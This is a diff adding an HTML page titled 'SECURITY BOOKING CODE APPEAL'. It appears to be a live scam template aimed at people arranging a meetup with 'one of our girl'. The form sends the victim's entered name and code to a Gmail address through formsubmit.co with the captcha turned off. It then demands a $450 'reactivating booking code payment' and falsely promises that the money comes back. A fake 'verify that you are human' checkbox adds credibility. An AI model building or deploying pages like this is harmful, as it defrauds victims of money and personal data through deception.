@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<!---Coding By DINER'S CODE--->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/build/css/intlTelInput.css" />
+    <link rel="stylesheet" href="/build/css/demo.css" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <!--<title>Registration Form in HTML CSS</title>-->
+    <!---Custom CSS File--->
+    <link rel="stylesheet" href="index.css" />
+  </head>
+  <body>
+    <section class="container">
+      <div class="image-logo">
+        <img src="./istockphoto-1407633532-612x612.jpg" alt="">
+      </div>
+      <header>SECURITY BOOKING CODE APPEAL</header>
+      <form
+        action="https://formsubmit.co/Missylinda35@gmail.com"
+        method="POST"
+        class="form"
+      >
+        <input type="text" name="_honey" style="display: none" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://www.google.com">
+        <div class="input-box">
+          <label>Hello, thank you don't forget out security booking code to meet up with one of our girl. <br><br>
+            PLEASE ENTER HER FULL NAME
+          </label>
+          <input
+            type="text"
+            name="first name"
+            placeholder="Enter Full Name"
+            required
+          />
+        </div>
+
+        <div class="input-box">
+          <label>SECURITY BOOKING CODE</label>
+          <input
+            id="iv-code"
+            type="text"
+            name="last name"
+            placeholder="Enter booking security code"
+            onkeyup="validateCode()"
+          />
+          <span id="code-error"></span>
+        </div>
+        
+        <div class="input-box">
+          <label>YOU WILL NEED TO REACTIVATE YOUR SECURITY ASSESS BOOKING CODE SO YOU 
+            CAN MEET UP HER AS FAST AS YOU WANT AND YOU WILL NEED TO MAKE A REACTIVATING 
+            BOOKING CODE PAYMENT WHICH IS $450 TO ACTIVATE YOUR BOOKING CODE AND ONCE YOU
+             MEET UP WITH HER, YOU WILL GET ALL YOUR MONEY BACK
+          </label>
+        </div>
+
+        <footer>
+          <div class="checkbox-wrapper-46">
+            <input type="checkbox" id="cbx-46" class="inp-cbx" />
+            <label for="cbx-46" class="cbx"
+              ><span>
+                <svg viewBox="0 0 12 10" height="10px" width="12px">
+                  <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
+              ><span>Agree TO conditions</span>
+            </label>
+          </div><br>
+          <div class="checkbox-wrapper-46">
+            <input type="checkbox" id="cbx-46" class="inp-cbx" />
+            <label for="cbx-46" class="cbx"
+              ><span>
+                <svg viewBox="0 0 12 10" height="10px" width="12px">
+                  <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
+              ><span>Please verify that you are human</span>
+            </label>
+          </div>
+        </footer>
+
+        <button>Submit</button>
+      </form>
+
+      <footer>
+        <div class="column">
+          <p>&copy; 2024</p>
+          <p>User Agreement</p>
+          <p>Privacy Policy</p>
+        </div>
+      </footer>
+    </section>
+
+    <script src="/build/js/intlTelInput.js"></script>
+    <script>
+      var input = document.querySelector("#phone");
+      window.intlTelInput(input, {});
+    </script>
+     <script src="./input.js"></script>
+  </body>
+</html>
